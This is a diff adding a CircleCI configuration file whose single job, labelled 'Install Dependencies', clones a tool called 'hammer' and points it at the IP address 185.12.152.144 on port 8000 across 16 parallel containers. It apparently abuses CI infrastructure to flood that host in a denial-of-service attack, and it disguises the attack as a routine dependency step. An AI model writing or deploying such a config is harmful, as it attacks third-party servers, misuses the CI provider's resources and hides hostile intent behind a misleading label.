@@ -1,0 +1,16 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: debian:latest
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: apt update && apt install python3 git -y && git clone https://github.com/cyweb/hammer && cd hammer && python3 hammer.py -s 185.12.152.144 -t 8000
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
